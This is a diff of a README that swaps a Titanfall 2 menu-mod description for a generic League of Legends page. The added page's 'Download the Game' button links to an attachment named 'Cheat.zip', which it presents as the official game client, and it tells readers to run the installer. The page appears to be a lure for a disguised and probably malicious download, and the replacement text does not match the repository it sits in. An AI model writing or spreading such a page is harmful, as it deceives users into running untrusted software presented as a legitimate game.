@@ -1,120 +1,64 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# League of Legends
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the League of Legends repository! 🎮 
 
+![league-of-legends](https://github.com/username/repository/images/league-of-legends.jpg)
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Introduction
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+League of Legends is a multiplayer online battle arena (MOBA) game developed and published by Riot Games. The game features a roster of powerful champions, each with unique abilities, engaging in intense battles across various game modes. This repository is dedicated to all things related to League of Legends, including resources, guides, scripts, and more!
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To get started with League of Legends, follow these simple steps:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+1. **Download the Game:** Click the button below to download the League of Legends game client.
 
-## Icepick
+[![Download League of Legends](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+2. **Install the Game:** Run the downloaded installer and follow the on-screen instructions to set up the game on your system.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+3. **Create an Account:** Once the game is installed, create a new account or log in to your existing one to start playing.
 
-3) Launch Icepick.
+## Features
 
-## Northstar
+### Champions
+League of Legends offers a diverse roster of champions, each with their unique playstyles and abilities. From swift assassins to powerful tanks, there is a champion for every playstyle. Explore different champions, master their abilities, and strategize with your team to achieve victory.
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+### Game Modes
+Whether you prefer intense 5v5 battles in Summoner's Rift, strategic gameplay in Twisted Treeline, or fast-paced action in ARAM, League of Legends offers a variety of game modes to suit every player. Jump into your favorite mode or try something new to keep the gameplay experience fresh and exciting.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+### Competitive Gameplay
+Join ranked matches to test your skills against players of similar levels. Climb the competitive ladder, earn rewards, and showcase your mastery of the game. Work with your team, communicate effectively, and make strategic decisions to outplay your opponents and claim victory on the battlefield.
 
-3) Launch Northstar.
+## Resources
 
-## Screenshots
+Explore the resources provided in this repository to enhance your League of Legends experience:
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+- **Guides:** Access in-depth guides and tutorials to improve your gameplay, learn new strategies, and master different aspects of League of Legends.
 
-Main Menu with the original Titanfall 2 menu video
+- **Scripts:** Discover useful scripts and tools designed to enhance your gaming experience, automate certain tasks, or customize the game to suit your preferences.
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+- **Community:** Connect with other League of Legends players, share tips and strategies, and participate in discussions to stay updated on the latest news and developments in the League of Legends community.
 
-Main Menu with the showcase removed to declutter the menu
+## Get Involved
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+Are you a League of Legends enthusiast? Do you have ideas, resources, or contributions to share? Feel free to contribute to this repository by submitting your scripts, guides, or other League of Legends-related content. Your contributions will help enrich the experience for players worldwide.
 
-New Cheat options that can be enabled as well as the extras menu
+## Stay Connected
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+Stay connected with the League of Legends community and receive the latest updates, announcements, and events:
 
-Added keybinds for speedrunners and extra commands for fun
+- Follow [Riot Games](https://riotgames.com) on Twitter for official news and announcements.
+- Join the [League of Legends Subreddit](https://reddit.com/r/leagueoflegends) to engage with the community and discuss gameplay strategies.
+- Subscribe to the [League of Legends YouTube Channel](https://youtube.com/leagueoflegends) for gameplay videos, tutorials, and more.
 
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
+Let's embark on an epic journey in the world of League of Legends! 🚀
 
-Shows the values for each setting on the Advanced Look Options
+---
 
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
+**Disclaimer:** This repository is not affiliated with Riot Games or League of Legends. All trademarks and game assets belong to their respective owners.
 
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
+**Trademark Notice:** League of Legends and Riot Games are trademarks or registered trademarks of Riot Games, Inc.
 
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+**Contributors:** Special thanks to all the contributors who have helped improve this repository with their valuable contributions and feedback.
